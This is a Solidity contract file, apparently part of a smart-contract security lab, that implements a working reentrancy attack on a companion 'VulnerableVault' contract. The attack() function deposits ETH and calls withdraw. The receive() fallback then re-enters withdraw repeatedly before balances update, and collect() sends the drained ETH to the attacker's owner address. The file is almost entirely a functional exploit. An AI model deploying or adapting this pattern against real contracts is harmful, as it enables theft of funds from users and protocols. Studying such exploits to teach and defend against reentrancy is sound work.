// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./01_Reentrancy.sol"; 

contract ReentrancyAttacker {
    VulnerableVault public vault;
    address public owner;

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
        owner = msg.sender;
    }

    // Inicializa depositando ETH no vault
    function attack() public payable {
        require(msg.value > 0, "send some ETH");
        // deposit into the vault using this contract as msg.sender
        vault.deposit{value: msg.value}();
        // then trigger withdraw which is vulnerable
        vault.withdraw();
    }

    // Receives ETH and tries to reenter while the vault still hasn't updated balances
    receive() external payable {
        // reenter while vault still has funds
        if (address(vault).balance >= 1 ether) {
            try vault.withdraw() {} catch {}
        }
    }

    // helper to collect funds to owner after attack
    function collect() external {
        require(msg.sender == owner, "only owner");
        payable(owner).transfer(address(this).balance);
    }
}
